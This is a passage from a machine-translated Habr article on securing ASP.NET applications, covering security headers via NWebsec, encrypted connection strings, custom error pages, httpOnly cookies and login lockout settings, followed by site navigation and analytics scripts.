class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Application_BeginRequest</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">object</span></span></span></span><span class="hljs-function"><span class="hljs-params"> sender, EventArgs e</span></span></span><span class="hljs-function">)</span></span> { HttpContext.Current.Response.AddHeader(<span class="hljs-string"><span class="hljs-string">"X-FRAME-OPTIONS"</span></span>, <span class="hljs-string"><span class="hljs-string">"DENY"</span></span>); }</code> </pre> <br><h2>  NWebsec </h2><br><p>  To add a header, you can use a fairly popular NuGet package called NWebsec.  The author of the package is Andre N. Klingsheim. <br>  NWebsec can be used with regular ASP.NET applications as well as with Core 1.1 <br>  The following tags will appear in an ASP.NET application after installing the package in web.config: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">nwebsec</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">httpHeaderSecurityModule</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://nwebsec.com/HttpHeaderSecurityModuleConfig.xsd"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:noNamespaceSchemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"NWebsecConfig/HttpHeaderSecurityModuleConfig.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">httpHeaderSecurityModule</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">nwebsec</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  As their content, you can add a header installation.  Let's say this option: </p><br><pre> <code class="hljs pgsql">&lt;redirectValidation enabled="true" /&gt; &lt;securityHttpHeaders&gt; &lt;x-XSS-Protection <span class="hljs-keyword"><span class="hljs-keyword">policy</span></span>="FilterEnabled" blockMode="true"/&gt; &lt;content-<span class="hljs-keyword"><span class="hljs-keyword">Security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Policy</span></span> enabled="true"&gt; &lt;/content-<span class="hljs-keyword"><span class="hljs-keyword">Security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Policy</span></span>&gt; &lt;x-Frame-<span class="hljs-keyword"><span class="hljs-keyword">Options</span></span> <span class="hljs-keyword"><span class="hljs-keyword">policy</span></span>="Deny"/&gt; &lt;x-Content-<span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Options</span></span> enabled="true" /&gt; &lt;/securityHttpHeaders&gt;</code> </pre> <br><p>  If you are using ASP.NET Core, the recommended option for adding headers is as follows: </p><br><pre> <code class="hljs javascript">app.UseXContentTypeOptions(); app.UseReferrerPolicy(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">opts</span></span></span><span class="hljs-function"> =&gt;</span></span> opts.NoReferrer());</code> </pre> <br><p>  before </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">app</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.UseStaticFiles</span></span>();</code> </pre> <br><p>  and after </p><br><pre> <code class="hljs javascript">app.UseXfo(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">xfo</span></span></span><span class="hljs-function"> =&gt;</span></span> xfo.Deny()); app.UseRedirectValidation();</code> </pre> <br><p>  One big minus of NWebsec is that the .NET Core 2.0 version is not yet supported. </p><br><h2>  The worst configuration errors </h2><br><h4>  Storing the database connection string </h4><br><p>  If you are working in a full-fledged ASP.NET, then the best storage option for the connection string is the web.config file.  And keep the string not in the clear, but in the encrypted form.  This can be done using the aspnet_regiis.exe utility. The easiest option is to run the Developer Command Prompt in administrator mode and execute the command </p><br><pre> <code class="hljs tex">aspnet_regiis.exe -pef connectionStrings C:<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">inetpub</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">wwwroot</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">YourAppName</span></span></span></span></code> </pre> <br><p>  2 parameters of the command is the section that needs to be encrypted (in this case, connectionStrings) and the path to the directory where the web.config file is located </p><br><p>  If you are working in an ASP.NET Core, then you can use the <a href="https://docs.microsoft.com/en-us/aspnet/core/security/app-secrets%3Ftabs%3Dvisual-studio">Secret Manager tool</a> to store strings during the development process. <br>  There is no ready-made version for production for .NET Core.  But if you host the application in Azure, you can save confidential information in the application settings </p><br><p><img src="https://habrastorage.org/webt/u4/4e/j_/u44ej_epfyoeli3enatkagmkgxk.png"></p><br><p>  In this case, the connection string itself can be transferred to a separate file.  For security reasons, this file should be excluded from the version control system. </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">connectionStrings</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">configSource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ConnectionStrings.config"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">connectionStrings</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  In the same way, you can make out confidential parameters: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">appSettings</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">file</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"AppSettingsSecrets.config"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">appSettings</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  In the file itself, you just need to specify the content that would be used as the content of the tags. </p><br><h4>  Hiding error messages </h4><br><p>  Perhaps you have ever seen the "yellow screen of death" with the text of the code in which the error occurred.  I did not accidentally put this recommendation right after the connection string.  The clearer will be an example in which an attacker can artificially create an error and get some useful information for himself.  Ideally, this could be a connection string.  Sometimes even a trifle can shorten the search time for site vulnerabilities.  If you have a classic ASP.NET application, then in web.config the CustomErrors mode is sure to leave On or at least RemoteOnly: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">customErrors</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">mode</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"On"</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre> <br><p>  In ASP.NET Core, you can split the mapping for development mode and for production using NuGet Microsoft.AspNetCore.Diagnostics package.  For example, to customize the display of an error message in the Configure method of the StartUp class, you can add: </p><br><pre> <code class="hljs mel"><span class="hljs-keyword"><span class="hljs-keyword">env</span></span>.EnvironmentName = EnvironmentName.Production; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">env</span></span>.IsDevelopment()) { app.UseDeveloperExceptionPage(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { app.UseExceptionHandler(<span class="hljs-string"><span class="hljs-string">"/error"</span></span>); }</code> </pre> <br><h4>  A few more web.config configuration errors </h4><br><p>  If all of a sudden you get into the web.config settings of the tracing or debug, then the production server must be set to false. </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">trace</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">enabled</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"false"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">localOnly</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">compilation</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">debug</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"false"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">targetFramework</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"4.5"</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre> <br><p>  In order for an attacker to not be able to access the cookie file (say, using XSS or some other method), it is necessary that the value of the following parameter be true </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">httpCookies</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">httpOnlyCookies</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">requireSSL</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"false"</span></span></span><span class="hljs-tag">/&gt;</span></span></code> </pre> <br><h4>  Broken Authentication and Session Management </h4><br><p>  For storing passwords and other confidential information, use only persistent hashi with salt.  OWASP recommends Argon2, PBKDF2, scrypt and bcrypt. </p><br><p>  Use Forms authentication for intranet sites only.  If you want to use web authentication, then switch to Identity. </p><br><p>  If you already use Identity with an ASP.NET Core application, then you can limit the number of attempts to enter a password by adding the following code to the ConfigureServices method of the Startup.cs file: </p><br><pre> <code class="hljs pgsql">services.Configure&lt;IdentityOptions&gt;(<span class="hljs-keyword"><span class="hljs-keyword">options</span></span> =&gt; { <span class="hljs-keyword"><span class="hljs-keyword">options</span></span>.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(<span class="hljs-number"><span class="hljs-number">30</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">options</span></span>.Lockout.MaxFailedAccessAttempts = <span class="hljs-number"><span class="hljs-number">10</span></span>; });</code> </pre> <br><p>  If you allow the user to edit some of his data, then check whether he edits his data (remember that the received data should not be trusted): </p><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> ActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">EditProfileInfo</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> id</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> user = _context.Users.FirstOrDefault(e =&gt; e.Id == id); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (user.Id == _userIdentity.GetUserId()) { <span class="hljs-comment"><span class="hljs-comment">//   } // ‚Ä¶ }</span></span></code> </pre> <br><h2>  Conclusion </h2><br><p>  As far as I could, I tried to put together everything that could be useful for ASP.NET developer.  Of course, the story did not work out about everything.  For example, you can still separately consider possible IIS configuration errors.  However, this material should be enough to learn the basic rules and not make blunders. </p><br><p>  We remind you that this is the full version of an <a href="https://xakep.ru/2017/12/21/asp-net-protection/">article from Hacker magazine</a> .  Its author is <a href="https://habrahabr.ru/users/asommer/">Alexey Sommer</a> . </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/350760/">https://habr.com/ru/post/350760/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../350750/index.html">How to write a one-page application (SPA) using Vue.js</a></li>
<li><a href="../350752/index.html">FastTrack Training. "Network Basics". "The structure of routers, routing platforms from Cisco." Eddie Martin December 2012</a></li>
<li><a href="../350754/index.html">SIP <-> Telegram: sip.tg</a></li>
<li><a href="../350756/index.html">AI.Hack - a series of hackathons in Moscow and St. Petersburg</a></li>
<li><a href="../350758/index.html">For a beginner webmaster: make a one-page on Bootstrap 4 for half an hour</a></li>
<li><a href="../350762/index.html">Introducing "npm ci" for faster and more reliable builds.</a></li>
<li><a href="../350764/index.html">Expanding the capabilities of CleanTalk Anti-Spam</a></li>
<li><a href="../350768/index.html">DigiCert revokes 23 thousand SSL certificates: what is the reason</a></li>
<li><a href="../350772/index.html">Convert React to Angular using a universal abstract tree. Proof of concept</a></li>
<li><a href="../350774/index.html">Java 9 - Have you switched? Not? Do not need ...!?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>